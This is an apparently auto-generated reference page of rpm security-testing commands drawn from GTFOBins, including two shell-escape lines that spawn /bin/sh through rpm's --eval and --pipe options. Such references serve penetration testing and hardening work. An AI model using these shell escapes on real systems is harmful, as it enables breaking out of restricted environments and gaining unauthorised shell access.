---
parsed_by: focuslocust
source: commands
type: generated
---
# rpm Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## rpm

Tool page: [rpm](../../tools/linux/rpm.md)

### command

```text
rpm -ivh x-1.0-1.noarch.rpm
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rpm` |
| Evidence | Function example preserved from source parser. |

### inherit

```text
rpm --eval '%{lua:...}'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rpm` |
| Evidence | Function example preserved from source parser. |

### shell

```text
rpm --eval '%(/bin/sh 1>&2)'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rpm` |
| Evidence | Function example preserved from source parser. |

### shell

```text
rpm --pipe '/bin/sh 0<&1'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rpm` |
| Evidence | Function example preserved from source parser. |
